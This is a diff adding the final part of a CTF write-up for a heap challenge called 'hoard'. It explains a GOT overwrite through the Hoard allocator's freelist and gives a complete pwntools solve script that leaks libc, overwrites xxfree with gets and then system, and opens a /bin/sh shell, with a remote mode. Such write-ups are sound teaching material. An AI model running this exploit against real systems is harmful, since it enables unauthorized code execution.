@@ -299,7 +299,7 @@ Unfortunately it wasn't as easy as that!
 
 The reason why it doesn't work is because after allocation the note pointer gets updated to the allocated memory
 
-So here if we overwrite `xxfree@got` to `system` and we try to make a new allocation inorder to overwrite `note` it would make the program exit because the freelist is corrupted so it allocates memory to the function of xxfree itself, so when we attempt to read into that memory `read` will fail and the program handles that
+So here if we overwrite `xxfree@got` to `system` and we try to make a new allocation inorder to overwrite `note` it would make the program exit because the freelist is corrupted so it allocates memory to the function of xxfree itself, so when we attempt to write into that memory `read` will fail and the program handles that by exiting
 
 <img width="1920" height="449" alt="image" src="https://github.com/user-attachments/assets/4e5e2841-c93d-45c5-984b-d44616d11ec0" />
 <img width="1920" height="176" alt="image" src="https://github.com/user-attachments/assets/6ac3b61d-47fe-48bc-829c-3ed69b2378b6" />
@@ -308,9 +308,144 @@ So here if we overwrite `xxfree@got` to `system` and we try to make a new alloca
 
 So yes this is quite a complication...
 
+What now? My goal still remained the same, find a way to write `/bin/sh` to `note`
+
+And this is how i achieved it...
+
+Like i initially already said, `note` contains the pointer to the got of `xxfree` and this means if we attempt to `free` it `rdi` now points to `note`
+
+So instead of overwriting the got to `system`, i overwrote it to `gets`
+
+Luckily `xxfree@got` was before `xxmalloc@got`
+<img width="1920" height="943" alt="image" src="https://github.com/user-attachments/assets/69e7d994-1815-433b-b430-6afbb2b4288f" />
+
+Basically what this means now is that, we can call gets to overwrite `xxfree` to `system` then overwrite `xxmalloc` to `malloc`
+
+With this when we allocate a new memory the program would rather use glibc malloc!
+
+And this would enable us to write `/bin/sh` to the heap and `xxfree` pointing to `system`
+
+Recall i said:
+- when a chunk of memory is allocated using `mmap` the offset between the libc region and that memory is usually a bit constant
+
+In this case i had to run it multiple times because ASLR? makes the offset difference between the libc base and memory different on each run, but there's still chances of it being the same as the constant i hardcoded
+
+Here's my local solve script:
+<img width="1920" height="991" alt="image" src="https://github.com/user-attachments/assets/2116a753-f185-478c-8601-a24520633c36" />
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+
+exe = context.binary = ELF('hoard_patched')
+libc = exe.libc
+# context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
+context.log_level = 'info'
+
+def start(argv=[], *a, **kw):
+    env = {"LD_PRELOAD":"libhoard.so"}
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, env=env, *a, **kw)
+    elif args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    elif args.DOCKER:
+        p = remote("localhost", 5000)
+        time.sleep(1)
+        pid = process(["pidof", "hoard"]).recvall().strip().decode()
+        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
+        return p
+    else:
+        return process([exe.path] + argv, *a, env=env, **kw)
 
 
+gdbscript = '''
+init-gef
+brva 0x1384  
+continue
+'''.format(**locals())
 
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+def init():
+    global io
+
+    io = start()
+
+
+def read(data):
+    io.sendlineafter(b">", b"1")
+    io.sendafter(b":", data)
+
+def write():
+    io.sendlineafter(b">", b"2")
+    io.recvuntil(b" ")
+    leak = io.recv(6)
+    return u64(leak.ljust(8, b"\x00"))
+
+def free():
+    io.sendlineafter(b">", b"3")
+
+
+def solve():
+
+    for _ in range(0x10):
+        read(b"A"*8)
+    
+    for _ in range(2):
+        free()
+    
+    global_heap = write() 
+    libc.address = global_heap - 0x3c0160
+    info("global heap: %#x", global_heap)
+    info("libc base: %#x", libc.address)
+    
+    got = libc.address + 0x40f078
+    info("got free: %#x", got)
+
+    try:
+        read(p64(got))
+        read(b"A"*8)
+        read(p64(libc.sym["gets"]))
+        free()
+
+        rop = ROP(libc)
+        pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
+        sh = next(libc.search(b"/bin/sh\x00"))
+        system = libc.sym["system"]
+
+        payload = flat(
+            [
+                pop_rdi,
+                sh,
+                system
+            ]
+        )
+
+        io.sendline(p64(libc.sym["system"]) + b"A"*(120-8) + p64(libc.sym["malloc"]))
+        read(b"/bin/sh\x00")
+        free()
+
+        io.interactive()
+    except Exception:
+        io.close()
+
+
+def main():
+    for i in range(10):
+        init()
+        solve()
+    
+
+if __name__ == '__main__':
+    main()
+```
+
+I really enjoyed this challenge tbh, i at first was in doubt as to whether i should give up on it and try something else, but good thing i pushed harder!
+
+This year being my first ICC and International Onsite CTF was great, I enjoyed the challenges and hope to participate in the next edition being stronger (watch out)!
 
 
 
